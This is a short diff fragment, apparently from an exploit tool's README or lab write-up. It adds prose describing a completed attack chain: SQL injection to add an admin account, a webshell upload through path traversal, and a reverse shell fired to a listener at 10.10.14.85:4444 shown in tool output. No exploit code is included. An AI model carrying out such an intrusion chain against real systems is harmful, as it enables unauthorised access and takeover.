@@ -695,6 +695,10 @@ Press Enter
 [*] firing reverse shell -> 10.10.14.85:4444
 [*] payload sent, check your listener
 ```
+
+The exploit completed all three phases successfully: the admin account was injected via SQL injection, authentication succeeded, the webshell was uploaded via path traversal and confirmed live, and the reverse shell payload was fired through it.
+
+The listener terminal received the callback simultaneously:
 <div align="center">
 <br>
 <br>
